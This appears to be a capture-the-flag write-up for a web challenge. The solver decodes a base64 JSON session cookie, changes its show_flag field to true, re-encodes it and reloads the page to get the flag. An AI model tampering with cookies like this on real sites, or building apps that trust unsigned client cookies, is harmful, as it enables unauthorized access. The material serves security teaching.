# json-ham:
## Description:
The challenge only gives you an URL to the webpage, as well as a small description:

---

If you want to see the flag, you must TRUEly want to see it.

_This task is BASED on 2×2×2×2×2×2_

[http://129.241.209.70:30742](http://129.241.209.70:30742)

---

Upon visiting the page you get redirected to a login page: [http://129.241.209.70:34742/login](http://129.241.209.70:34742/login).
Trying to log in with username admin and password admin, we get sent back to the index-page: [http://129.241.209.70:34742/](http://129.241.209.70:34742/login). The page prints the message:
```
Nope, show_flag says you can't see it.

Cookie: {'username': 'admin', 'password': 'admin', 'show_flag': False}
```

Opening the development panel of your favorite webbrowser and finding the cookie-section, in Firefox that's under Storage->Cookies, we find a cookie called user, with the value: `eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInNob3dfZmxhZyI6ZmFsc2V9`

What is this value? Well, there is both upper and lower-case letters, and numbers, that would make Base64 a possible encoding. Also the description says "This task is BASED on 2×2×2×2×2×2", and 2⁶ = 64, so lets try that.

There are multiple ways of decoding a base64-encoded string, in shell you can use:
```
$ echo "eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInNob3dfZmxhZyI6ZmFsc2V9" | base64 -d -
{"username":"admin","password":"admin","show_flag":false}
```

Now we atleast have the same value as shown on the site. Let's try to switch the show_flag and encode as base64 again.

```
$ echo '{"username":"admin","password":"admin","show_flag":true}' | base64 -
eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInNob3dfZmxhZyI6dHJ1ZX0K
```

With the new cookie value in hand, we can update the value of the user-cookie, then we can reload the page. Now the page should say:
```
show_flag says you have access, so here you go:

KID20{0P3n_5354m3} 
```